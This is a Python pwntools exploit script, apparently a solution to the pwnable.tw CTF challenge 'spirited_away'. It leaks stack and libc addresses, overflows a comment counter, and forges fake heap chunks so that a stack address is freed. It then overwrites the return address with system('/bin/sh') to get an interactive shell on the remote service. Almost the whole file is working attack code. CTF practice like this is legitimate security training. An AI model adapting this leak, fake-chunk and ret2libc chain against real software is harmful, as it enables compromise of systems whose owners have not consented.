#!/usr/bin/env python
# encoding: utf-8

from pwn import *
from sys import argv
from time import sleep
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]
# context.log_level = 'debug'
elf = ELF('./spirited_away')

if argv[1] == 'l':
    io = process('./spirited_away')
    libc = elf.libc
else:
    io = remote("chall.pwnable.tw", 10204)
    libc = ELF('./libc_32.so.6')


def enter(name,age,reason,comment):
    io.recvuntil('name: ')
    io.send(name)
    # sleep(0.01)
    io.recvuntil('age: ')
    io.sendline(str(age))
    # sleep(0.01)
    io.recvuntil('movie? ')
    io.send(reason)
    # sleep(0.01)
    io.recvuntil('comment: ')
    io.send(comment)
    # pause()
    # sleep(0.01)


# leak the ebp address and get the libc base
gdb.attach(io, 'b * 0x804870a')
enter('a' * 60, 0x11223344, 'b' * 80, 'c' * 60)
ebp = u32(io.recvuntil('\xff')[-4: ])
print '*****************'
print 'ebp -> ' + hex(ebp)
libcBase = u32(io.recvuntil('\xf7')[-4: ]) - libc.sym['_IO_2_1_stdout_']
print 'libcbase -> ' + hex(libcBase)
print '*****************'

# make the cnt to 100 to overflow
for i in range(100):
    io.sendafter('<y/n>: ', 'y')
    enter('a' * 60, 0x11223344, 'b' * 80, 'c' * 60)
    sleep(0.02)
    print i
# overflow the string to sprintf, and the n60 will be ord('n') = 110
context.log_level = 'debug'
sys_addr = libcBase + libc.sym['system']
binsh = libcBase + next(libc.search('/bin/sh'))
print 'sysaddress -> ' + hex(sys_addr)
print 'binsh -> ' + hex(binsh)
raw_input()

print 'cover the address of [name]'
sleep(0.5)
io.sendafter('<y/n>: ', 'y')
# name = 'a' * 60
# age = 
# 0x45 = 60 for usrdata 4 for presize 4for size and one for preinuse  update : 0x41 for the result of debug

reason = p32(0) + p32(0x41) + 'a' * 56 + p32(0) + p32(0x41)
fake_address = ebp - 0x68
print 'fakeaddress -> ' + hex(fake_address)
raw_input()
comt = 'a' * 80 + '1234' + p32(fake_address) + p32(0) + p32(0x41) #  + 'a' * 14
# enter('a' * 60, 0x11223344, reason, comt)
# raw_input()
#由于程序自身缺陷，按照正常的输入顺序导致站结构被破坏，不得不根据调试过程中程序的运行流程，去掉对age的输入。
io.sendafter('name: ', "a" * 60)
io.sendafter('movie? ', reason)
io.sendafter('comment: ', comt)

# cover the ret address and the argvs
io.sendafter('y/n>: ', 'y')
print "cover the ret address and the argvs"
sleep(0.5)

payload = 'a' * 76 + p32(sys_addr) + 'abcd' + p32(binsh)
# enter(payload, 0, 'bless', 'god bless me!')
# raw_input()
io.sendafter('name: ', payload)
io.sendafter('movie? ', 'god bless me!')
io.sendafter('comment: ', 'this is the comment!')

io.sendafter('<y/n>: ','n')

io.interactive()
io.close()
